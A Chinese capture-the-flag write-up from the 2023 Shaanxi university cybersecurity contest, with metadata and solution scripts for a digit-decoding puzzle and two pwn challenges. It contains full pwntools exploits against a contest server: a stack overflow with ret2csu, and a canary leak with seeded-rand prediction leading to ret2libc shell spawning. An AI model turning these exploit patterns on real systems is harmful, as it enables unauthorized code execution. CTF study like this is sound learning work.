---
title: 第三届陕西大学生网安技能大赛部分WP
contest: 第三届陕西大学生网安技能大赛
year: 2023
difficulty: medium
vuln_type: pwn_unknown
tags: [陕西大学生, 数字拆解字符串, 栈溢出ret2csu, canary泄露+ret2libc, srand爆破, pwntools]
attack_chain: 数字字符串拆分求和+chr(sum+64)→栈溢出'a'*152+ret2csu→canary泄漏+libc基址→ret2libc system(/bin/sh)
key_payload: "a='8881088410842088810810842042108108821041010882108881' 数字拆解;p64(0x00000000004005d6) ret2csu;canary leak+libcbase-171408;pop_rdi=0x0000000000400b93;system+libc+0x1d8698 /bin/sh"
one_liner: 第三届陕西大学生网安赛：数字拆解密码+栈溢出ret2csu+canary泄漏ret2libc
lesson: 数字字符串按0拆分后逐段求和+chr(sum+64)得字母；canary泄漏+ret2libc是栈溢出通用解
quality: medium
---

# 第三届陕西大学生网安技能大赛部分WP

**赛事**：第三届陕西大学生网安技能大赛（2023）

**第一题：数字拆解**：
```python
a = '8881088410842088810810842042108108821041010882108881'
s = a.split('0')
print(s)  # ['8881', '8841', '842', '8881', '81', '842', '421', '81', '8821', '41', '1', '8821', '881']
l = []
for i in s:
    sum = 0
    for j in i:
        sum += eval(j)
    l.append(chr(sum + 64))
print(''.join(l))
```

**Pwn题1：栈溢出 + ret2csu**：
```python
from pwn import *
p = remote('60.204.130.55', 10005)
p.recvuntil('?\n'); p.sendline('a')
p.recvuntil('?\n')
payload = 'a'*152 + p64(0x00000000004005d6) + p64(0x40082d)
p.sendline(payload)
p.interactive()
```

**Pwn题2：canary泄漏 + ret2libc**：
```python
from pwn import *
import ctypes
context.log_level = 'debug'
pop_rdi = 0x0000000000400b93

p = process("nc 60.204.130.55 10004", shell=True)
p.recvuntil(':'); p.sendline('1')
p.recvuntil('Game Go:\n')

# 爆破srand种子
libb = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
seed = libc.time(0)
libc.srand(seed)
p.sendline(str(libc.rand() % 100 + 1))

# 泄漏canary+libc
p.recv(0x48)
canary = u64(p.recv(8))
p.recv(8)
libcbase = u64(p.recvuntil(b'\x7f').ljust(8, b'\x00')) - 171408
print(hex(libcbase))

# ret2libc
system = libb.sym['system'] + libcbase
binsh = libcbase + 0x00000000001d8698
payload = b'a'*0x28 + p64(canary) + p64(0x0) + p64(0x000000000040073e) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendline(payload)
p.interactive()
```

**核心技术**：
- 数字字符串按0拆分 → 逐段求和 + chr(sum+64)得字母
- 栈溢出 ret2csu
- canary泄漏 → ret2libc
- srand(time(0))种子爆破

**质量评估**：中（payload完整但描述简略）
